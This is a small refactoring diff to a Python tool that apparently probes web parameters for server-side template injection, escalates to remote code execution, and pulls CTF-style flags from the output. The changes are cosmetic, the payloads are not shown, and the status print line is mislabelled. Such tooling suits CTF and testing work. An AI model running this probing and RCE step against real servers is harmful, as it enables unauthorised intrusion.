@@ -9,9 +9,9 @@
 """
 import argparse
 import re
-import requests
 import sys
 
+import requests
 
 PROBES = [
     # Jinja2
@@ -63,7 +63,7 @@ def main():
     headers = json.loads(args.headers) if args.headers else {}
     data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}
 
-    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
+    _, base_len, _ = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
     print(f"[base] status={base_len} len={base_len}")
 
     engine = None
@@ -91,7 +91,7 @@ def main():
     if rce:
         _, _, rce_text = _probe(args.url, args.method, headers, data, args.param, rce, args.timeout)
         print(f"[rce]\n{rce_text[:2000]}")
-        flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}', rce_text, re.I)
+        flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}', rce_text, re.IGNORECASE)
         if flags:
             print(f"[flag_candidates] {flags}")
             return 0
